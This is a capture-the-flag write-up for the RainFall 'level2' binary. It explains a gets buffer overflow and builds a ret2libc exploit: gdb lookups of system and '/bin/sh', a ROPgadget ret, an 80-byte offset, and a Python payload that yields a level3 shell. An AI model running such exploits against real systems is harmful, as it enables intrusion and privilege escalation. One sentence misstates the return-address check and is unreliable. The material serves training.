# level2


The `level2` binary reads our input (again) and echoes it back to us.

Disassembling the binary reveals a call to a function called `p`.

```c
void p(void)

{
  uint unaff_retaddr;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
    exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}
```

There are two interesting things here:

1. The `gets` function is used to read our input. This function is vulnerable to buffer overflows.
2. The address of the return address is checked to see if it is in the `0xb0000000` range. This is the range of addresses that are mapped to the stack. If the return address is not in this range, the program exits.

What's annoying however is the fact that there is no call to `system` or `execve` in the binary. This means that we can't just overwrite the return address with the address of `system` and pass `/bin/sh` as an argument.

So, since the binary has the `libc` linked to it, we will do it ourselves.

We need these things :

- The address of the `system` function
- The address of the `/bin/sh` string (there's one in the `libc`)
- The address of a ROP gadget that will allow us to return before the `exit` call (a `ret` will do the trick)

We can find the address of the `system` function and the `/bin/sh` string by using `gdb`:

```bash
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) r
Starting program: /home/user/level2/level2 

Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find 0xb7e6b060, +9999999, "/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) 
```

To find our gadget we will use ROPGadget:

```bash
pip install ROPGadget
ROPgadget --binary level2 | grep 'ret'

0x080485c0 : repz ret
0x08048363 : ret # This one looks good
0x080484d0 : ror cl, 1 ; ret

```

| Name | Address |
| ---- | ------- |
| `system` | `0xb7e6b060` |
| `/bin/sh` | `0xb7f8cc58` |
| gadget | `0x08048363` |

One last thing we need is the size of the buffer. We can find it by using `gdb` w/ `gef`:

```bash
gdb level2
gef➤  pattern create 128
[+] Generating a pattern of 128 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
gef➤  r
Starting program: /home/user/level2/level2
<pattern>
[#0] Id 1, Name: "level2_bin", stopped 0x61616175 in ?? (), reason: SIGSEGV
```

0x61616175 = 'aaau', so our buffer is 80 bytes long.

Now we can write our exploit using Python and the `struct` module :

```python
import struct

SYSTEM_ADDY = 0xb7e6b060
BINSH_ADDY = 0xb7f8cc58
GADGET = 0x08048363
PAYLOAD = b'A' * 80

# Pack the address of the system function
PAYLOAD += struct.pack('I', GADGET) # Pack the address of the gadget
PAYLOAD += struct.pack('I', SYSTEM_ADDY) # I = unsigned int (4 bytes) in little endian
PAYLOAD += b'AAAA' # Here we need to put 4 bytes of padding because 4 bytes of the stacks gets popped
PAYLOAD += struct.pack('I', BINSH_ADDY) # Pack the address of the /bin/sh string

print(PAYLOAD)
```

```bash
level2@RainFall:~$ vi /tmp/gen_pl.py
level2@RainFall:~$ python /tmp/gen_pl.py > /tmp/pl_level2
level2@RainFall:~$ cat /tmp/pl_level2 - | ./level2
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
```